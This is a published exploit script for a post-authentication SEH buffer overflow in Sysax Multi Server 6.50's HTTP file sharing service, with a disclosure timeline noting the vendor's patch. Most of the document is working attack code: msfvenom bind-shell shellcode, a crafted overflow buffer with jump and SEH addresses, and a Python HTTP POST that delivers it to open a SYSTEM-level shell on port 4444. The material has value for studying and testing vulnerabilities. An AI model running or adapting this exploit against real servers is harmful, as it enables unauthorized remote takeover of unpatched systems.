# Exploit Title: Sysax Multi Server 6.50 HTTP File Share SEH Overflow RCE Exploit
# Date: 03/21/2016
# Exploit Author: Paul Purcell
# Contact: ptpxploit at gmail
# Vendor Homepage: http://www.sysax.com/
# Vulnerable Version Download: http://download.cnet.com/Sysax-Multi-Server/3000-2160_4-76171493.html (6.50 as of posting date)
# Version: Sysax Multi Server 6.50
# Tested on: Windows XP SP3 English
# Category: Remote Code Execution
#
# Timeline: 03/11/16 Bug found
#           03/14/16 Vender notified
#           03/17/16 Vender acknowledges issue and publishes patch (6.51)
#           03/21/16 Exploit Published
#
# Summary:  This is a post authentication exploit that requires the HTTP file sharing service to be running on
#           Sysas Multi Server 6.50. The SID can be retrieved from your browser's URL bar after logging into the
#           service. Once exploited, the shellcode runs with SYSTEM privileges.  In this example, we attack folder_
#           in dltslctd_name1.htm.  The root path of the user shouldn't break the buffer offset in the stack, though
#           the user will need to have permission to delete folders.  If the user has file delete permissions, file_
#           will work as well.  mk_folder1_name1 is also vulnerable with a modified buffer, so this same exploit can
#           be modified to adapt to a users permissions.

import httplib

target = 'webbackup'
port = 80
sid = '57e546cb7204b60f0111523409e49bdb16692ab5'            #retrieved from browser URL after login
#example: http://hostname/scgi?sid=57e546cb7204b60f0111523409e49bdb16692ab5&pid=dltslctd_name1.htm

#msfvenom -p windows/shell_bind_tcp LPORT=4444 --platform windows -a x86 -f c -b "\x00\x0a"

shell=("\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd7\xae"
"\x73\xe9\x83\xeb\xfc\xe2\xf4\x2b\x46\xf1\xe9\xd7\xae\x13\x60"
"\x32\x9f\xb3\x8d\x5c\xfe\x43\x62\x85\xa2\xf8\xbb\xc3\x25\x01"
"\xc1\xd8\x19\x39\xcf\xe6\x51\xdf\xd5\xb6\xd2\x71\xc5\xf7\x6f"
"\xbc\xe4\xd6\x69\x91\x1b\x85\xf9\xf8\xbb\xc7\x25\x39\xd5\x5c"
"\xe2\x62\x91\x34\xe6\x72\x38\x86\x25\x2a\xc9\xd6\x7d\xf8\xa0"
"\xcf\x4d\x49\xa0\x5c\x9a\xf8\xe8\x01\x9f\x8c\x45\x16\x61\x7e"
"\xe8\x10\x96\x93\x9c\x21\xad\x0e\x11\xec\xd3\x57\x9c\x33\xf6"
"\xf8\xb1\xf3\xaf\xa0\x8f\x5c\xa2\x38\x62\x8f\xb2\x72\x3a\x5c"
"\xaa\xf8\xe8\x07\x27\x37\xcd\xf3\xf5\x28\x88\x8e\xf4\x22\x16"
"\x37\xf1\x2c\xb3\x5c\xbc\x98\x64\x8a\xc6\x40\xdb\xd7\xae\x1b"
"\x9e\xa4\x9c\x2c\xbd\xbf\xe2\x04\xcf\xd0\x51\xa6\x51\x47\xaf"
"\x73\xe9\xfe\x6a\x27\xb9\xbf\x87\xf3\x82\xd7\x51\xa6\x83\xdf"
"\xf7\x23\x0b\x2a\xee\x23\xa9\x87\xc6\x99\xe6\x08\x4e\x8c\x3c"
"\x40\xc6\x71\xe9\xc6\xf2\xfa\x0f\xbd\xbe\x25\xbe\xbf\x6c\xa8"
"\xde\xb0\x51\xa6\xbe\xbf\x19\x9a\xd1\x28\x51\xa6\xbe\xbf\xda"
"\x9f\xd2\x36\x51\xa6\xbe\x40\xc6\x06\x87\x9a\xcf\x8c\x3c\xbf"
"\xcd\x1e\x8d\xd7\x27\x90\xbe\x80\xf9\x42\x1f\xbd\xbc\x2a\xbf"
"\x35\x53\x15\x2e\x93\x8a\x4f\xe8\xd6\x23\x37\xcd\xc7\x68\x73"
"\xad\x83\xfe\x25\xbf\x81\xe8\x25\xa7\x81\xf8\x20\xbf\xbf\xd7"
"\xbf\xd6\x51\x51\xa6\x60\x37\xe0\x25\xaf\x28\x9e\x1b\xe1\x50"
"\xb3\x13\x16\x02\x15\x83\x5c\x75\xf8\x1b\x4f\x42\x13\xee\x16"
"\x02\x92\x75\x95\xdd\x2e\x88\x09\xa2\xab\xc8\xae\xc4\xdc\x1c"
"\x83\xd7\xfd\x8c\x3c")

arg="folder_"                       #can also be changed to file_ if user has file delete permissions
pid="dltslctd_name1"                #Can be changed, though padding will needed to be updated as well 
junk1="A"*26400                     #Initial pile of junk
noppad="\x90"*296                   #Place to land from our long jump and before our shellcode
junkfill="\x90"*(768-len(shell))    #Fill in after our shellcode till nseh    
nseh="\xeb\x06\x90\x90"             #Short jump over SEH
seh="\xd7\x2a\x92\x5d"              #pop esi # pop edi # ret RPCNS4.dll
jump="\xe9\x13\xfc\xff\xff"         #jump back 1000 bytes for plenty of room for your shellcode
junk2="D"*9500                      #Junk at the end


buff=(arg+junk1+noppad+shell+junkfill+nseh+seh+jump+junk2)

 
head = "Host: Wee! \r\n"
head += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0\r\n"
head += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
head += "Accept-Language: en-us,en;q=0.5\r\n"
head += "Accept-Encoding: gzip, deflate\r\n"
head += "Referer: http://gotcha/scgi?sid="+sid+"&pid="+pid+".htm\r\n"
head += "Proxy-Connection: keep-alive\r\n"
head += "Content-Type: multipart/form-data; boundary=---------------------------20908311357425\r\n"
head += "Content-Length: 1337\r\n"
head += "If-Modified-Since: *\r\n"
head += "\r\n"
head += "-----------------------------217830224120\r\n"
head += "\r\n"
head += "\r\n"
head += "\r\n"
head += buff

conn = httplib.HTTPConnection(target,port)
conn.request("POST", "/scgi?sid="+sid+"&pid="+pid+".htm", head)

